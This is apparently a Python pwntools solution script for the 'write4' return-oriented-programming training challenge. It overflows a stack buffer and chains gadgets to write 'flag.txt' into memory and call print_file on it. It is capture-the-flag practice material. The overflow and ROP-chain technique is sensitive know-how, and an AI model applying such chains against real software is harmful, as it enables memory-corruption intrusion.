#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  '.'

io = start()

"""
0x0000000000400628: mov qword ptr [r14], r15; ret; 
0x0000000000400690: pop r14; pop r15; ret; 
0x0000000000400693: pop rdi; ret; 

"""

print_file = p64(0x400510)
dss = p64(0x0000000000601028 + 0x20)    # data segment to write flag.txt
pop_r14_r15 = p64(0x0000000000400690)
www_gadget = p64(0x0000000000400628)
pop_rdi = p64(0x0000000000400693)

buf = "\x90"*40
buf += pop_r14_r15
buf += dss
buf += "flag.txt"
buf += www_gadget

# calling print_file("flag.txt")

buf += pop_rdi
buf += dss
buf += print_file

write("in.txt", buf)
io.sendline(buf)
io.interactive()

